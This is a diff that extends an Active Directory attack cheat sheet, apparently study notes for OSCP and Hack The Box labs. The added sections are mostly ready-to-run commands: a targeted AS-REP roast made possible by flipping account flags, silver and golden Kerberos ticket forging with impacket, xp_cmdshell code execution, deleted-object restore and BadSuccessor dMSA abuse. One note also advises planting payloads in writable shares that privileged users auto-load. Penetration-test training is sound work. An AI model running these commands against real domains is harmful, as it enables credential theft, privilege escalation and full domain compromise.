@@ -54,6 +54,11 @@ net rpc password "victim" "NewPass123!" -U "target.htb"/"me"%"mypass" -S $IP
 Set-DomainUserPassword -Identity victim -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)
 # GenericAll / GenericWrite on user -> set SPN then kerberoast (targeted), or shadow creds
 Set-DomainObject -Identity victim -Set @{serviceprincipalname='fake/x'}   # then kerberoast
+# GenericWrite on user -> TARGETED AS-REP roast (no SPN needed): flip DONT_REQ_PREAUTH,
+#   roast, then revert. If the account is disabled, clear ACCOUNTDISABLE FIRST or the roast fails:
+bloodyAD -u me -p pass -d target.htb --host $IP add uac victim -f DONT_REQ_PREAUTH
+impacket-GetNPUsers target.htb/ -dc-ip $IP -request-user victim -no-pass -format hashcat
+bloodyAD -u me -p pass -d target.htb --host $IP remove uac victim -f DONT_REQ_PREAUTH   # cleanup
 # GenericAll on group -> add yourself
 net group "Target Group" me /add /domain
 # GenericAll on computer / shadow credentials (modern):
@@ -144,8 +149,33 @@ nxc smb $IP -u user -p pass -M ntdsutil           # if admin
 impacket-psexec -hashes :<admin_nthash> administrator@<dc_ip>
 ```
 
+### Ticket forging — Silver vs Golden (know which hash forges what)
+First untangle the terminology, it trips people up:
+- **NT hash** = `MD4(UTF-16LE(password))`. This *is* "the NTLM hash" people mean for PtH/ticketer.
+- **NetNTLMv2** = the challenge-response blob (Responder/coercion). **Cannot be passed** — you *crack* it to get the password, then derive the NT hash.
+```bash
+# NT hash from a cleartext password you cracked:
+python3 -c 'import hashlib;print(hashlib.new("md4","P@ssw0rd!".encode("utf-16le")).hexdigest())'
+```
+`impacket-ticketer` forges two different things — pick by what key material you hold:
+```bash
+# SILVER ticket: service account's NT hash + domain SID + SPN.
+#   Forges a TGS for THAT ONE service only, as any user (e.g. administrator).
+impacket-ticketer -nthash <svc_NT> -domain-sid <SID> -domain corp.local \
+  -spn MSSQLSvc/sql01.corp.local:1433 administrator
+export KRB5CCNAME=administrator.ccache
+impacket-mssqlclient -k sql01.corp.local        # then enable_xp_cmdshell -> RCE as the svc/SYSTEM
+
+# GOLDEN ticket: krbtgt NT hash (or AES key) + domain SID. Forges a TGT for ANYONE, anywhere.
+#   Needs krbtgt -> you must already be DCSync-capable / on the DC. A service acct hash will NOT do this.
+impacket-ticketer -nthash <krbtgt_NT> -domain-sid <SID> -domain corp.local administrator
+```
+> Confirm the SPN actually maps to the account (`setspn` / BloodHound) before forging a silver ticket — it only works against the service that account runs. If the DC enforces AES, swap `-nthash` for `-aesKey <aes256>`. For the exam, silver tickets are a stepping stone (RCE on one service → escalate); a golden ticket means you already won (had krbtgt).
+
 ### Useful AD glue
 - Time sync if Kerberos errors (`KRB_AP_ERR_SKEW`): `sudo ntpdate $DC` or `sudo timedatectl set-ntp off; sudo rdate -n $DC`.
+- `KDC_ERR_WRONG_REALM`: your realm string doesn't match the AD domain's **full DNS name**. Set `$DOMAIN` to the exact FQDN (e.g. `corp.local`, not `corp`), uppercase it in `krb5.conf`'s `[libdefaults] default_realm`.
+- Picky/locked-down DC throwing odd Kerberos errors: in `/etc/krb5.conf` set `rdns = false` and `dns_canonicalize_hostname = false` under `[libdefaults]`, and always target the DC by **FQDN** (matches the SPN). Get a TGT with `impacket-getTGT corp.local/user:pass` then `export KRB5CCNAME=user.ccache` and add `-k -no-pass` to impacket/nxc.
 - Add DC + domain to `/etc/hosts`; use FQDN for Kerberos.
 - `--local-auth` flag on nxc for local (non-domain) accounts.
 - MSSQL linked-server double-hop (POO pattern): `EXEC ('xp_cmdshell ...') AT [LINKED]`.
@@ -191,8 +221,24 @@ nxc smb $IP -u u -p p -M gpp_password ; gpp-decrypt <cpassword>
 # LAPS local-admin passwords (if readable):
 nxc ldap $IP -u u -p p -M laps
 ```
+> A **writable share isn't only a cred source — it's a code-exec vector.** If a higher-priv user or a scheduled process auto-loads content from a path you can write (VS Code extensions / `extensions.json`, startup scripts, profile/`Documents` paths, an app's plugin dir, Outlook rules), plant a payload there and it runs **in their context** → lateral movement without their password. Check share ACLs with `smbcacls`/BloodHound; SID-based ACLs survive object recreation.
+
+### Sealed LDAP, object restore & newer primitives
+- **LDAP signing / channel-binding enforced** (binds fail with `strongerAuthRequired`, or BloodHound collectors choke on plain LDAP)? Many tools can't seal a plain bind. Use **bloodyAD** (NTLM sealing built in) for read/write, or run everything over **Kerberos** (`getTGT` + ccache, krb5.conf as above). If LDAPS (636) just resets, there's no LDAPS cert on the DC → go NTLM-sealed/Kerberos, don't fight 636.
+```bash
+bloodyAD -u user -p pass -d corp.local --host dc01.corp.local get writable   # what can I edit?
+# legacy bloodhound-python can't seal plain binds; rusthound-ce hits the same wall w/o Kerberos.
+# collect via Kerberos ccache, or use bloodyAD to walk ACLs directly.
+```
+- **Tombstone reanimation** (restore a deleted AD object): with `WRITE` on a deleted (tombstoned) object **and** `CREATE_CHILD` on a target OU, undelete it back into the directory — useful when a privileged-but-removed account is the intended path:
+```bash
+bloodyAD -u user -p pass -d corp.local --host dc01.corp.local set restore <deletedObj> \
+  --newParent OU=Employees,DC=corp,DC=local
+```
+- **BadSuccessor / dMSA** (Windows **Server 2025** only): with `CreateChild` on an OU, create a `msDS-DelegatedManagedServiceAccount` that "supersedes" a privileged account, then request its TGT — the KDC grants the predecessor's privileges. Tools: `SharpSuccessor`, NetExec `badsuccessor` module, `bloodyAD` badSuccessor. Point the create at an **OU where `CreateChild` is confirmed** (not a user DN) and run as the principal holding that right. **Out of current OSCP exam scope** (no 2025 DCs on the exam) — lab/HTB only.
+- **Shadow credentials** (`msDS-KeyCredentialLink`, via Whisker/certipy) need **PKINIT / AD CS** on the DC. If PKINIT is disabled (`KDC_ERR_PADATA_TYPE_NOSUPP` on cash-out, 636 resets with no cert), shadow creds are a **dead end** — pivot to targeted AS-REP/kerberoast or password reset instead. Don't keep retrying Whisker.
 
 ### OSCP-scope note
-Focus drills: AS-REP roast, Kerberoast, password spray, ACL abuse (ForceChangePassword / GenericAll / GenericWrite), local-priv->SYSTEM via SeImpersonate (Potato) and SeBackupPrivilege NTDS dump, PtH/PtT lateral movement, secretsdump, DCSync. **Above exam scope** (skip unless needed): RODC golden tickets, KeyList attacks, ESC16/advanced ADCS, unconstrained-delegation printerbug chains.
+Focus drills: AS-REP roast, Kerberoast, password spray, ACL abuse (ForceChangePassword / GenericAll / GenericWrite), local-priv->SYSTEM via SeImpersonate (Potato) and SeBackupPrivilege NTDS dump, PtH/PtT lateral movement, secretsdump, DCSync. **Above exam scope** (skip unless needed): RODC golden tickets, KeyList attacks, ESC16/advanced ADCS, unconstrained-delegation printerbug chains, BadSuccessor/dMSA (Server 2025).
 
 ---
